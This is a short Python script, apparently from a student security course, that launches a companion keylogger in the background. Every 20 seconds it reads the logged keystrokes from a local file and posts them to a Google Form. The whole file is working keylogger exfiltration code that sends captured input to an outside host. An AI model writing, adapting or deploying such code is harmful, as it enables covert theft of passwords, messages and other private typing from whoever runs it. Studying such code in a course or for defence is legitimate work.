import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 '/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scripts/Security Scripts/KeyloggerRemote.py' &")
time.sleep(1)

def send_request():
    form_input = open("/home/dakendall/Documents/ITP270_FALL2022/ITP270/Python Scripts/Security Scripts/keyboard_input.txt")
    form_send = form_input.read()
    url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSe29PKiw9gmJ2lvh9_yrY_EvM1pVVrcuMsKnMOhd7PIF6gO4A/formResponse'
    form_data = {'entry.839337160':f"'{form_send}'"}
    r = requests.post(url, data=form_data)

def interval():
    global startlog
    if time.time() - 20 > startlog:
        #print('its been 20 secs')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    #print(counter)
    interval()
    time.sleep(1)